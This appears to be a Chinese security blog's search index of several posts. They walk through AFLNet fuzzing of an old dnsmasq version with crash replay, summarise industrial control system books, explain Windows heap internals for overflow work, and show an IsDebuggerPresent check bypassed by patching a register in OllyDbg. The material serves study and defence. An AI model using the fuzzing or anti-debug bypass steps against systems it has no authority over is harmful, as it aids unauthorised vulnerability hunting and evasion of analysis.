[{"title":"Aflnet简单实践","url":"/2021/01/26/aflnet/","content":"\n\n\n AFLNet已在2020年ICST上被接受发布。\n\n```\n@inproceedings{AFLNet,\nauthor={Van{-}Thuan Pham and Marcel B{\\\"o}hme and Abhik Roychoudhury},\ntitle={AFLNet: A Greybox Fuzzer for Network Protocols},\nbooktitle={Proceedings of the 13rd IEEE International Conference on Software Testing, Verification and Validation : Testing Tools Track},\nyear={2020},}\n```\n\n<!-- more -->\n\nAFLNET是一个基于AFL开发的网络协议测试工具，其最大的优点在于有效地利用了服务器的响应信息，以指导下一次的Fuzz。\n\n 有状态的黑盒模糊检测（SBF）是目前比较受欢迎的fuzz方法，学术界Sulley或BooFuzz，工业界的Peach，特点是利用FSM或者图遍历协议模型，并生成符合语法的消息序列。这种方法虽部分解决了第一个挑战，但是其的效果通常取决与设计的状态模型，这种模型通常需要由有经验的分析者/开发者基于对该协议的知识，以及结合端点之间的网络流量具体设计。设计的模型可能不会百分百符合黑盒内的协议，毕竟网络协议的实现取决于各个开发者，可能存在对协议的误解，或是实现时增加新的特性。此外现有的SBF方法尽管可以生成一些数据去触发一些特殊状态，然而并未将这类数据进行保留以指导未来的fuzz行为，例如，并不会更新现有的状态模型。针对这个问题，AFLNET的解决方案是比较合理的。\n\n 其流程可以描述如下:程序的输入是数据包文件，程序内部的parser会对数据包进行分析，Parser随协议不同而采用不同设计，目的在于解析出Request请求，这些请求将组合为一个个序列，作为序列数据集。数据集中的序列会通过Mutator变异后发往Server，Server对request返回response，response数据包将被程序捕获，提取其中的状态码，判断该状态码位于FSM的何处，若原本的模型中不存在该状态码，则FSM中会增加一个结点代表该状态。程序中的State Selector将会分析程序当前的FSM模型，从中选出较少遍历/未曾遍历的状态（这是通过一个优先级机制实现的），传递给sequence selector，使之选择出可以触发该状态的request序列。当然，一开始由于缺乏统计信息，State的选取是随机化的。\n\n![image-20201005165901975](https://i.loli.net/2020/10/05/Zylq4FunIUhm6JR.png)\n\n### 安装\n\naflnet官方的教程非常详细，首先下载\n\n```shell\n# First, clone this AFLNet repository to a folder named aflnet\ngit clone <links to the repository> aflnet\n# Then move to the source code folder\ncd aflnet\nmake clean all\ncd llvm_mode\n# The following make command may not work if llvm-config cannot be found\n# To fix this issue, just set the LLVM_CONFIG env. variable to the specific llvm-config version on your machine\n# On Ubuntu 18.04, it could be llvm-config-6.0 if you have installed clang using apt-get\nmake\n# Move to AFLNet's parent folder\ncd ../..\nexport AFLNET=$(pwd)/aflnet\nexport WORKDIR=$(pwd)\n```\n\naflnet的用法和afl非常相似，可以afl --help查看详情\n\n- ***-N netinfo***: server information 服务器信息 (e.g., tcp://127.0.0.1/8554)\n- ***-P protocol***: application protocol to be tested 目标的协议类型 (e.g., RTSP, FTP, DTLS12, DNS)\n- ***-D usec***: (optional) waiting time (in micro seconds) for the server to complete its initialization 等待时间\n- ***-K*** : (optional) send SIGTERM signal to gracefully terminate the server after consuming all request messages  使用所有请求消息后发送SIGTERM信号以正常终止服务器\n- ***-E*** : (optional) enable state aware mode 启动状态感知模式\n- ***-R*** : (optional) enable region-level mutation operators 启用区域级别的突变运算符\n- ***-F*** : (optional) enable false negative reduction mode \n- ***-c script*** : (optional) name or full path to a script for server cleanup 服务器清理脚本的名称或完整路径\n- ***-q algo***: (optional) state selection algorithm 状态选择算法(e.g., 1. RANDOM_SELECTION, 2. ROUND_ROBIN, 3. FAVOR)\n- ***-s algo***: (optional) seed selection algorithm种子选择算法 (e.g., 1. RANDOM_SELECTION, 2. ROUND_ROBIN, 3. FAVOR)\n\n**实例命令：**\n\n```shell\nafl-fuzz -d -i in -o out -N <server info> -x <dictionary file> -P <protocol> -D 10000 -q 3 -s 3 -E -K -R <executable binary and its arguments (e.g., port number)>\n```\n\n### 实践--以dnsmasq为例\n\n首先下载dnsmasq的源码,切换版本到2.73，使用afl-clang-fast进行编译\n\n```shell\n# Assuming AFLNet is in ~/aflnet\nexport AFLNET=$HOME/aflnet\nexport WORKDIR=$HOME\nexport AFL_PATH=$AFLNET\nif [[ ! $PATH == *\"$AFLNET\"* ]]; then export PATH=$AFLNET:$PATH; fi\ncd ~\n# Clone the Dnsmasq repository\ngit clone git://thekelleys.org.uk/dnsmasq.git\n# Move to the directory\ncd dnsmasq\n# Checkout a specific version\ngit checkout v2.73rc6\n# Compile source\nCC=$AFLNET/afl-clang-fast make\n# Copy configuration file\nsudo cp $AFLNET/tutorials/dnsmasq/dnsmasq.conf /etc/\n# Move to the src directory\ncd src/\n```\n\n成功编译Dnsmasq之后，我们可以通过添加地址来解析并`dig`用于查询主机名来测试服务器：\n\n```shell\n# Add an address to resolve\necho address=/test.com/5.5.5.5 | sudo tee -a /etc/dnsmasq.conf\n# Run Dnsmasq and don't daemonize (the dnsmasq.conf file will specify port 5353)\n./dnsmasq\n```\n\n然后我们dig一下目标\n\n```\ndig @127.0.0.1 -p 5353 test.com\n\n; <<>> DiG 9.11.3-1ubuntu1.12-Ubuntu <<>> @127.0.0.1 -p 5353 test.com\n; (1 server found)\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 40722\n;; flags: qr aa rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0\n\n;; QUESTION SECTION:\n;test.com.\t\t\tIN\tA\n\n;; ANSWER SECTION:\ntest.com.\t\t0\tIN\tA\t5.5.5.5\n\n;; Query time: 0 msec\n;; SERVER: 127.0.0.1#5353(127.0.0.1)\n;; WHEN: Tue May 19 14:19:38 EDT 2020\n;; MSG SIZE  rcvd: 42\n```\n\n可以开始进行fuzz了\n\n```shell\ncd $WORKDIR/dnsmasq/src\nafl-fuzz -d -i $AFLNET/tutorials/dnsmasq/in-dns -o out-dns -N tcp://127.0.0.1/5353 -P DNS -D 10000 -K -R ./dnsmasq\n```\n\n运行一段时间后就会有crash了\n\n![image-20200929152459965](https://i.loli.net/2020/09/29/uEFhGyWXidzct9C.png)\n\n当有crash之后我们如何重现漏洞现场，aflnet之中自带了重现工具aflnet-replay，具体用法类似于\n\n```shell\naflnet-replay packet_file protocol port [first_resp_timeout(us) [follow-up_resp_timeout(ms)]]\n```\n\n我们可以先gdb 一下dnsmasq然后使用aflnet-replay发送poc\n\n![image-20201005173801528](https://i.loli.net/2020/10/05/EI3oTXiGKw7QnpR.png)\n\n可以看到目标服务崩溃了，位置断在forward.c:1895上\n\n\n\n相同思路可以应用到其余的网络协议服务之上，比如bind9的named应用程序，但是发现可能会存在crash误报的情况，按理来说aflnet通过识别发送回的状态码进行服务器状态判别应该误差不会太大，还要再读一读论文了解一下原理。\n\n![image-20201005092715081](https://i.loli.net/2020/10/05/ojEiPm2t537HAJ6.png)\n\naflnet还有很多功能可以进行探索，比如作者在推特上提到的ipsm.dot，可以时时看到fuzz的进程进度。\n\n![image-20201005175339428](https://i.loli.net/2020/10/05/qRyhgEftc7wJLzr.png)\n\n","tags":["fuzz","论文阅读"],"categories":["二进制"]},{"title":"（读书笔记）工业控制系统安全概述","url":"/2021/01/25/《黑客大曝光-工控安全》读书笔记/","content":"\n## 第一篇：工业控制系统安全概述\n\n工控安全不仅需要了解常见的网络硬件和操作系统的网络安全知识，还需要知道控制系统的安全知识，以及工业过程的物理和工程要求，因此工控安全要求涵盖内容广泛，涉及多个学科。\n\n<!-- more -->\n\n### 信息物理系统\n\nPLC的核心是梯形逻辑，而梯形逻辑的核心是一个大型的if-then-else决策树，用于对过程或生产操作进行顺序控制。PLC的诞生带来了大量的基于逻辑电路的数字系统的出现，例如SCADA、DCS等\n\n![image-20191022151640909](https://tva1.sinaimg.cn/large/006y8mN6ly1g8702lv38uj30rs0w0ndi.jpg)\n\n资产所有者需要管理两个网络：负责业务信息的信息技术（IT）网络和负责生产运行维护的运营技术（OT）网络。现在，IT与OT的相互融合已经十分流行。\n\n####  传统威胁的全新攻击向量\n\n原本在隔离网络中几乎被完全忽略的控制系统网络威胁突然走上前台\n\n工控系统的设备、协议以及应用程序本身设计之初都没有考虑到安全问题（以为是隔离的）\n\n这些系统本身具有的关键性和敏感性使得对其开展补丁修复工作十分困难\n\n工控环境中经常会出现IT技术能力匮乏的情况\n\n####  后果\n\n![image-20191022152808634](https://tva1.sinaimg.cn/large/006y8mN6ly1g870ehivzmj318s0rsgxz.jpg)\n\n![image-20191022152847907](https://tva1.sinaimg.cn/large/006y8mN6ly1g870f65y8kj31tv0rsn9x.jpg)\n\n#### 工控的现实风险\n\nKim Zetter撰写的《Countdown to Zere Day：Stuxnet and the Launch of the World‘s First Digital Weapon》（Crown，2014）有详尽的时间表和相关统计\n\n### 工业控制系统概述\n\n工业控制系统根据其功能大致可以归入以下三种类别中的一个或多个：画面、监视、控制。\n\n####  画面\n\n画面（View）功能即观察过程的当前状态以便做出决策\n\n####  监视\n\n监视（Monitor）功能就是监视过程的当前状态，这些状态包括液位、温度、阀位置和进给率等诸多要素。\n\n它与画面的区别在于，监视还包括了报警、事件状态以及不良过程状态警告。\n\n####  控制\n\n控制（Control）的作用是启动控制阀门、电机以及引起机械物理状态发生变化的其他组件并对其加以控制。\n\n![image-20191022154945077](https://tva1.sinaimg.cn/large/006y8mN6ly1g8710z4iyaj33340c77wh.jpg)\n\n####  用于工控系统的普渡参考模型\n\n普渡参考模型在工控系统行业也被简称为普渡模型（Purdue Model），广泛用于描述大型工控系统中所有重要组件之间的主要相互依赖关系与互联关系。\n\n![image-20191022155522391](https://tva1.sinaimg.cn/large/006y8mN6ly1g8716tqqiqj30xs0rsqqw.jpg)\n\n##### 第五层：企业区\n\n企业区负责供应链管理。\n\n这一层次一般不与工控系统直接相连，但是对于来自各个OT网络和工控系统组件的准确、及时的信息有着明确的要求\n\n##### 第四层：现场业务规划和组织\n\n第五层通常设置在公司总部，第四层设置在每个现场、车间或者设施中控制本地设施运行的it系统\n\n该层从第五层接受工单，对底层情况进行监控，并对第五层的数据进行更新\n\n##### 工控系统非军事区层\n\n该层（ICS-DMZ）实现了IT和OT之间的信息共享。\n\nDMZ区的作用是不将下层关键组件直接暴露给攻击者的情况下实现IT信息的安全交换\n\n##### 第三层：现场制造和操作控制\n\n![image-20191022160605291](https://tva1.sinaimg.cn/large/006y8mN6ly1g871hz5nhcj330j0rs1kz.jpg)\n\n##### 第二层：区域监控\n\n第二层有许多与第三层相同的功能，但是第二层主要通过过程单元或者生产线级的功能实现对过程中单个区域的本地控制。\n\n实际的工控系统开始在本层出现，例如可编程控制器（PLC）和变频驱动器（VFD）\n\n第二层的主要系统还包括人机界面（HMI）\n\n##### 第一层：基本控制\n\n虽然第二层也有plc和vfd，但是第一层才是这些设备主要出现的地方。\n\n第一层包括基本过程控制系统(BPCS).它主要执行并管理以下功能：\n\n![image-20191022161439973](https://tva1.sinaimg.cn/large/006y8mN6ly1g871qwjqw3j32nj0rsqv5.jpg)\n\n##### 第零层：过程\n\n![image-20191022161616713](https://tva1.sinaimg.cn/large/006y8mN6ly1g871skttb6j33340p21ky.jpg)\n\n##### 功能安全层\n\n![image-20191022161652622](https://tva1.sinaimg.cn/large/006y8mN6ly1g871t8cn7dj32sr0rshdu.jpg)\n\n##### 总揽\n\n![image-20191022161744768](https://tva1.sinaimg.cn/large/006y8mN6ly1g871u45ppaj315t0rstnw.jpg)\n\n#### 常用控制功能、设备和组件的类型\n\n##### 监控与数据采集系统\n\nSCADA主要指在广阔的地理空间区域中一组不同类型的工控系统设备，可以将SCADA看作是构成整个工控系统的所有独立的控制和通信组件的总和。\n\n![image-20191022162217821](https://tva1.sinaimg.cn/large/006y8mN6ly1g871yufxouj31h20rs1ef.jpg)\n\n##### 集散控制系统\n\n大型系统使用集散控制系统（DCS）实现对大型设施中的数千个I/O节点的自动控制。\n\nDCS和SCADA之间的差异十分微小，但是传统上SCADA更多的用于控制分散在不同地理位置上的操作，而DCS通常部署在工厂厂区内。\n\n##### 可编程控制器\n\nPLC主要包含三个主要的组件：微控制器、扩展插槽和背板。下图是两种PLC\n\n![image-20191022163339696](https://tva1.sinaimg.cn/large/006y8mN6ly1g872anxnvkj318u0rsnih.jpg)\n\n微控制器（microcontroller）是PLC的大脑，包含了固件、程序（通常梯形逻辑）和设定点。通常还有其他的拓展模块，将这些部件连接在一起是背板（backplane），由硬线接口对多个设备和微控制器之间的通信提供支持。\n\n##### 人机界面\n\n人机界面（HMI）是工控系统的“画面”。\n\n![image-20191022163831914](https://tva1.sinaimg.cn/large/006y8mN6ly1g872fq7096j316f0rs4g9.jpg)\n\n##### 安全仪表系统\n\n安全仪表系统（SIS）是精心设计的专用控制系统\n\n![image-20191022163955034](https://tva1.sinaimg.cn/large/006y8mN6ly1g872h652poj31m20rs4qq.jpg)\n\n##### 变频驱动器\n\n变频驱动器（VFD）本质上就是“智能”的电机。他们是小规模PLC的一种变形形式，也被称为驱动器控制器（drive controller）\n\n![image-20191022164208077](https://tva1.sinaimg.cn/large/006y8mN6ly1g872jhh7kvj30rs0yzh6j.jpg)\n\n","tags":["读书笔记"],"categories":["工控"]},{"title":"堆的知识与利用（0day2）","url":"/2021/01/25/堆的知识与利用/","content":"\n由于微软公司并没有完全公开其操作系统中堆管理的细节。因而到目前为止，对于 Windows 堆的了解主要是源于许多安全专家、技术爱好者的研究成果。并且基于堆的溢出攻击一度被认为是不太可能的。但是自从 Matt Conover 在CanSecWest 2004 黑客大会上发表了关于 Windows下堆溢出利用的演讲后，研究人员才逐渐开始把视线转移到基于堆的缓冲区溢出研究中来。\n\n另外，值得提出的是，堆与栈是两种完全不同的内存表现形式。栈只有 POP和 PUSH 两种操作，管理机制相对比较简单。而堆在内存中的形式则比较凌乱，显得无序，并且使用后需要程序员自行释放内存，否则会造成内存泄漏。因而利用堆溢出的攻击也相对较难。\n\n![image-20200114160233870](https://tva1.sinaimg.cn/large/006tNbRwly1gaw5g912c7j320f0rsqlh.jpg)\n\n<!-- more -->\n\n## 堆的基础知识\n\n序员在使用堆时只需要做三件事情：申请一定大小的内存，使用内存，释放内存。我们下面将站在实现一个堆管理机制的设计者角度，来看看怎样才能向程序员提供这样透明的操作。\n对于堆管理系统来说，响应程序的内存使用申请就意味着要在“杂乱”的堆区中“辨别”出哪些内存是正在被使用的，哪些内存是空闲的，并最终“寻找”到一片“恰当”的空闲内存区域，以指针形式返回给程序。\n（1）“杂乱”是指堆区经过反复的申请、释放操作之后，原本大片连续的空闲内存区可能呈现出大小不等且空闲块、占用块相间隔的凌乱状态。\n（2）“辨别”是指堆管理程序必须能够正确地识别哪些内存区域是正在被程序使用的占用块，哪些区域是可以返回给当前请求的空闲块。\n（3）“恰当”是指堆管理程序必须能够比较“经济”地分配空闲内存块。如果用户申请使用8个字节，而返回给用户一片512字节的连续内存区域并将其标记成占用状态，这将造成大量的内存浪费，以致出现明明有内存却无法满足申请请求的情况。\n\n为了完成这些基本要求，必须设计一套高效的数据结构来配合算法。现代操作系统的堆数据结构一般包括堆块和堆表两类。\n**堆块**：出于性能的考虑，堆区的内存按不同大小组织成块，以堆块为单位进行标识，而不是传统的按字节标识。一个堆块包括两个部分：块首和块身。块首是一个堆块头部的几个字节，用来标识这个堆块自身的信息，例如，本块的大小、本块空闲还是占用等信息；块身是紧跟在块首后面的部分，也是最终分配给用户使用的数据区。\n提示：<u>堆管理系统所返回的指针一般指向块身的起始位置，在程序中是感觉不到块首的存在的</u>。然而，连续地进行内存申请时，如果您够细心，<u>可能会发现返回的内存之间存在“空隙”，那就是块首！</u>\n**堆表**：堆表一般位于堆区的起始位置，用于索引堆区中所有堆块的重要信息，包括堆块的位置、堆块的大小、空闲还是占用等。堆表的数据结构决定了整个堆区的组织方式，是快速检索空闲块、保证堆分配效率的关键。堆表在设计时可能会考虑采用平衡二叉树等高级数据结构用于优化查找效率。现代操作系统的堆表往往不止一种数据结构。\n\n堆的内存组织结构如下图：\n\n![image-20200114160914791](https://tva1.sinaimg.cn/large/006tNbRwly1gaw5n5u56rj315k0rs78m.jpg)\n\nWindows中，<u>占用态的堆块被使用它的程序索引</u>，而<u>堆表只索引所有空闲态的堆块</u>。其中，最重要的堆表有两种：空闲双向链表Freelist（以下简称空表）和快速单向链表Lookaside（以下简称快表）。\n\n### 1.空表\n\n空闲堆块的块首中包含一对重要的指针，这对指针用于将空闲堆块组织成双向链表。按照堆块的大小不同，空表总共被分为128条。\n\n![image-20200114161450223](https://tva1.sinaimg.cn/large/006tNbRwly1gaw5tqn8a1j31980u0e3z.jpg)\n\n堆区一开始的堆表区中有一个128项的指针数组，被称做空表索引（Freelist array）。该数组的每一项包括两个指针，用于标识一条空表。\n如图所示，空表索引的第二项（free[1]）标识了堆中所有大小为8字节的空闲堆块，之后每个索引项指示的空闲堆块递增8字节，例如，free[2]标识大小为16字节的空闲堆块，free[3]标识大小为24字节的空闲堆块，free[127]标识大小为1016字节的空闲堆块。因此有：\n空闲堆块的大小＝索引项（ID）×8（字节）\n把空闲堆块按照大小的不同链入不同的空表，可以方便堆管理系统高效检索指定大小的空闲堆块。需要注意的是，空表索引的第一项（free[0]）所标识的空表相对比较特殊。这条双向链表链入了所有大于等于1024字节的堆块（小于512KB）。这些堆块按照各自的大小在零号空表中升序地依次排列下去，您会在稍后发现这样组织的好处。\n\n### 2.快表\n\n快表是Windows用来加速堆块分配而采用的一种堆表。这里之所以把它叫做“快表”是因为这类单向链表中从来不会发生堆块合并（其中的空闲块块首被设置为占用态，用来防止堆块合并）。\n快表也有128条，组织结构与空表类似，只是其中的堆块按照单链表组织。快表总是被初始化为空，而且每条快表最多只有4个结点，故很快就会被填满。\n\n![image-20200114162043122](https://tva1.sinaimg.cn/large/006tNbRwly1gaw5z3brr4j30py0m7q5j.jpg)\n\n\n\n堆中的操作可以分为堆块分配、堆块释放和堆块合并（Coalesce）三种。其中，“分配”和“释放”是在程序提交申请和执行的，而堆块合并则是由堆管理系统自动完成的。\n\n### 1.堆块分配\n\n堆块分配可以分为三类：<u>快表分配、普通空表分配和零号空表（free[0]）分配</u>。\n从快表中分配堆块比较简单，包括寻找到大小匹配的空闲堆块、将其状态修改为占用态、把它从堆表中“卸下”、最后返回一个指向堆块块身的指针给程序使用。\n普通空表分配时首先寻找最优的空闲块分配，若失败，则寻找次优的空闲块分配，即最小的能够满足要求的空闲块。\n零号空表中按照大小升序链着大小不同的空闲块，故在分配时先从free[0]反向查找最后一个块（即表中最大块），看能否满足要求，如果能满足要求，再正向搜索最小能够满足要求的空闲堆块进行分配（这就明白为什么零号空表要按照升序排列了）。\n堆块分配中的“找零钱”现象：当空表中无法找到匹配的“最优”堆块时，一个稍大些的块会被用于分配。这种次优分配发生时，会先从大块中按请求的大小精确地“割”出一块进行分配，然后给剩下的部分重新标注块首，链入空表。这里体现的就是堆管理系统的“节约”原则：买东西的时候用最合适的钞票，如果没有，就要找零钱，决不会玩大方。\n由于快表只有在精确匹配时才会分配，故不存在“找钱”现象。\n\n### 2.堆块的释放\n\n释放堆块的操作包括将堆块状态改为空闲，链入相应的堆表。所有的释放块都链入堆表的末尾，分配的时候也先从堆表末尾拿。\n另外需要强调，快表最多只有4项。\n\n### 3.堆块的合并\n\n经过反复的申请与释放操作，堆区很可能变得“千疮百孔”，产生很多内存碎片。为了合理有效地利用内存，堆管理系统还要能够进行堆块合并操作，如图所示。\n当堆管理系统发现两个空闲堆块彼此相邻的时候，就会进行堆块合并操作。\n堆块合并包括将两个块从空闲链表中“卸下”、合并堆块、调整合并后大块的块首信息（如大小等）、将新块重新链入空闲链表。\n\n在具体进行堆块分配和释放时，根据操作内存大小的不同，Windows采取的策略也会有所不同。可以把内存块按照大小分为三类：\n小块：SIZE<1KB\n大块：1KB≤SIZE<512KB\n巨块：SIZE≥512KB\n\n![image-20200114163505782](https://tva1.sinaimg.cn/large/006tNbRwly1gaw6e25csoj30wi0u04qp.jpg)\n\n对应的分配和释放算法也有三类，我们可以通过下表来理解Windows的堆管理策略。\n\n![image-20200114163603753](https://tva1.sinaimg.cn/large/006tNbRwly1gbch0sys86j317k0m8aen.jpg)\n\n最后，再强调一下Windows堆管理的几个要点。\n（1）快表中的空闲块被设置为占用态，故不会发生堆块合并操作。\n（2）快表只有精确匹配时才会分配，不存在“搜索次优解”和“找零钱”现象。\n（3）快表是单链表，操作比双链表简单，插入删除都少用很多指令。\n（4）综上所述，快表很“快”，故在分配和释放时总是优先使用快表，失败时才用空表。\n（5）快表只有4项，很容易被填满，因此空表也是被频繁使用的。\n综上所述，Windows的堆管理策略兼顾了内存合理使用、分配效率等多方面的因素。","tags":["读书笔记"],"categories":["二进制"]},{"title":"反调试初步学习总结与简单实战","url":"/2021/01/25/反调试/","content":"\n### 概念\n\n反调试是一种重要的软件保护技术，特别是在各种游戏保护中被尤其重视。另外，恶意代码往往也会利用反调试来对抗安全分析。当程序意识到自己可能处于调试中的时候，可能会改变正常的执行路径或者修改自身程序让自己崩溃，从而增加调试时间和复杂度。\n\n<!-- more -->\n\n###  分类\n\n以下是几种windows下的反调试方法：\n\n（1）函数检测\n\n函数检测就是通过Windows自带的公开或未公开的函数直接检测程序是否处于调试状态。\n\n（2）数据检测\n\n数据检测是指程序通过测试一些与调试相关的位置信息的数据来判断是否处于调试状态。\n\n（3）符号检测\n\n符号检测主要针对一些使用了驱动的调试器或监视器，这类调试器在启动后会创建相应的驱动链接符号，以用于应用层与其驱动的通信。但由于这些符号都比较固定，所以我们就可以通过这些符号来确定是否存在相应的调试软件。\n\n（4）窗口检测\n\n窗口检测通过检测当前桌面中是否存在特定的调试窗口来判断是否存在调试器，但不能判断该调试器是否正在调试该程序。\n\n（5）特征码检测\n\n特征码检测枚举当前正在运行的进程，并在进程的内存空间中搜索特定调试器的代码片段。\n\n（6）行为检测\n\n行为检测是指在程序中通过代码感知程序处于调试时与未处于调试时的各种差异来判断程序是否处于调试状态。\n\n（7）断点检测\n\n断点检测是根据调试器设置断点的原理来检测软件代码中是否设置了断点。\n\n（8）行为占用\n\n行为占用指的是在需要保护的程序中，程序自身将一些只能同时有一个实例的功能占为己有。\n\n###  作用\n\n反调试技术常常用来保护关键性的程序或软件，一旦该程序被调试就会出现错误。\n\n同时反调试技术也常常用于恶意代码的开发过程之中。恶意代码用它识别是否被调试，或者让调试器失效。恶意代码编写者意识到分析人员经常使用调试器来观察恶意代码的操作，因此他们使用反调试技术尽可能地延长恶意代码的分析时间。为了阻止调试器的分析，当恶意代码意识到自己被调试时，它们可能改变正常的执行路径或者修改自身程序让自己崩溃，从而增加调试时间和复杂度。\n\n###  基本过程\n\n下面我们以一个简单的函数检测为例，即自带的IsDebuggerPresent函数检测是否使用了调试器。基本的代码为：\n\n```c++\nint main(){\nif (IsDebuggerPresent())\n{\n\tcout <<\"朋友，你在使用调试器啊！\"<<endl;\n\tsystem(\"pause\");\n\texit(-1);\n}\n\nelse\n\tcout <<\"success!\"<<endl;\n\tsystem(\"pause\");\n\treturn 0;\n}\n```\n\n编译截图如下所示：\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g754k5ujb8j30so0itjrz.jpg) \n\n我们尝试一下在正常环境下打开和在OllyDbg中打开看看有什么不同。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g754khkcdvj312v0d4wm3.jpg) \n\n我们了解到，IsDebuggerPresent这个函数可以用在程序中检测当前程序是否被调试，若被调试从而退出，达到反调试的目的。我们将其拉入OllyDbg中查看一下该机制是如何运转的。\n\n打开OD，正常载入程序，此时不要运行，搜索IsDebuggerPresent并在所有调用这个函数的地方下断点。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g754kqvf1vj30vk0itmyt.jpg) \n\n使用F9键运行，程序会断在做断点的地方，此后我们使用F8键一步一步的运行来分析程序，我们发现转到了下图的四句命令中，这四句是关键，我们会逐步分析。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g754kwfpp0j30ie0audj8.jpg) \n\n对于第一句mov eax, dword ptr fs:[18] ，它的意思为将地址为fs:[18]处的数据放到eax中，我们从下方的消息窗口能看到fs:[18]地址为7FFDF018，我们转到这个地址可以得知存的值为7FFDF000，则猜测eax中也为此值，继续F8单步运行。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g754l1668rj30f208eju5.jpg) \n\n执行此步时，可以看到右上角寄存器中eax的值印证了我们的猜测。对于第二句mov eax, dword ptr [eax+30]，这个时候是将偏移30字节的数据放到eax中。依旧按照第一句的查询方法可以发现对应的数据：7FFD8000。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g754l5vt61j30wr09q42c.jpg) \n\n继续执行F8，第三句movzx eax, byte ptr [eax+2]，是将刚刚eax中所得的值作为地址，再+2偏移的一个字节数据放到eax中，其它位置都补充为0.\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g754l9j8czj31ne0pc759.jpg) \n\n由图可得对应的数据是1，接着程序就根据返回值是否是1来判断是否正在调试中，值为1就意味着正在被调试，值为0标志着正常运行。\n\n那我们反反调试就十分简单了，将eax的值重新设定为0就可以成功绕过检测。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g754ldsq2xj32ah0t0q9g.jpg) \n\n随后继续正常运行，发现运行成功。成功反反调试。\n\n![img](https://tva1.sinaimg.cn/large/006y8mN6ly1g754lhi20pj30ji09uq63.jpg) ","tags":["个人总结","反调试"],"categories":["二进制"]},{"title":"（读书笔记）通过威胁建模获取具有可操作性的工控系统威胁情报","url":"/2021/01/25/工控系统威胁建模/","content":"\n## 第三篇：通过通过威胁建模获取具有可操作性的工控系统威胁情报\n\n威胁情报就是有关潜在威胁的信息\n\n情报与可操作情报：并非所有的情报都有现实意义，只有找到相关联性才能从可操作的情报转化为具有现实意义的情报\n\n威胁信息与威胁情报存在差异\n\n<!-- more -->\n\n### 威胁信息与威胁情报\n\n典型的威胁信息通常由威胁源、威胁源的动机、能力以及活动组成，也可以包括威胁源感兴趣的目标\n\n威胁情报就是信息，但是威胁情报主要是关于分析处理过的潜在威胁信息，并对机构而言有运营价值。\n\n具有现实意义的可操作威胁情报，也可以将其称之为可操作战术情报。\n\n无论威胁情报应用于网络安全项目的哪个阶段，其成功的运营关键取决于以下几个阶段：\n\n![image-20191024085502375](https://tva1.sinaimg.cn/large/006y8mN6ly1g890a33uuzj314t0rskhu.jpg)\n\n![image-20191024085553023](https://tva1.sinaimg.cn/large/006y8mN6ly1g890ayxoagj33340pcb29.jpg)\n\n### 威胁建模：将工控系统威胁信息转化为“可操作”的威胁情报\n\n#### 工控系统杀伤链\n\n工控系统杀伤链考虑到攻击者用以了解过程环境、实施针对工控系统的重大攻击，以及漏洞利用工具部署之前对漏洞进行测试、验证及调查的方法和总体过程。\n\n上述攻击活动的区分要素可以在杀伤链的第二阶段中找到。\n\n![image-20191024090636241](https://tva1.sinaimg.cn/large/006y8mN6ly1g890m47vstj314u0rsqop.jpg)\n\n报告作者还特别将涉及工控系统所可能导致的工控系统后果分类进行了分解画面\n\n![image-20191024090744753](https://tva1.sinaimg.cn/large/006y8mN6ly1g890nav8xrj31040rsncz.jpg)\n\n#### 工控系统威胁建模过程\n\n构建风险场景需要深刻理解攻击方法和技术及正在评估的工控系统环境\n\n风险即：由于目标对象所存在的潜在脆弱性，威胁源将通过威胁向量而导致威胁事件发生的可能性，以及由此而产生的后果和影响\n\n对于一个可行的威胁事件，必须包含下面四个要素：\n\n![image-20191024092715993](https://tva1.sinaimg.cn/large/006y8mN6ly1g8917m9tkxj32zr0rs4qp.jpg)\n\n一旦确定并了解了潜在的威胁源、脆弱性以及针对脆弱性的威胁向量，就可以得到构成一次可行的威胁事件所需要的全部内容\n\n![image-20191024092850780](https://tva1.sinaimg.cn/large/006y8mN6ly1g89199iy29j31gz0rsh4m.jpg)\n\n然后，将构建的威胁事件映射到相关后果之上，并与业务目标进行比较，从而完成风险场景的构建。\n\n![image-20191024093017111](https://tva1.sinaimg.cn/large/006y8mN6ly1g891armrd8j32fl0rs1kx.jpg)\n\n如果在威胁源与肯能导致严重后果的漏洞之间不存在完整路径，那么也可以认为该漏洞目前其实没有什么风险。这一结论的得出也取决于所获的信息的质量以及对信息分析的质量。\n\n风险评估过程最后阶段的风险验证和风险计算步骤完成之后，可以进一步提高这些信息的可操作性和质量。\n\n![image-20191024093339468](https://tva1.sinaimg.cn/large/006y8mN6ly1g891e9gac9j31jb0rskeb.jpg)\n\n#### 信息收集\n\n为了确保威胁建模和风险分析评估过程能够提供有效的效果，需要收集适当的信息对其进行正确的分析。","tags":["读书笔记"],"categories":["工控"]},{"title":"工控学习路径","url":"/2021/01/25/工控学习路径/","content":"\n工业控制系统概述\n目的：简单的了解什么是工业控制系统、工业控制系统框架、工业控制系统安全现状等理论基础知识，在对工业控制系统有了一定的了解后在展开实践。\n\n<!-- more -->\n\n学习方法：通过网上搜集相关资料进行学习，最好直接看一些工控安全的相关书籍，书籍里都讲的很清楚。下面推荐几本入门书籍：\n1.《黑客大曝光：工业控制系统安全》\n2.《工业控制网络安全技术与实践》\n3.《S7-300/400 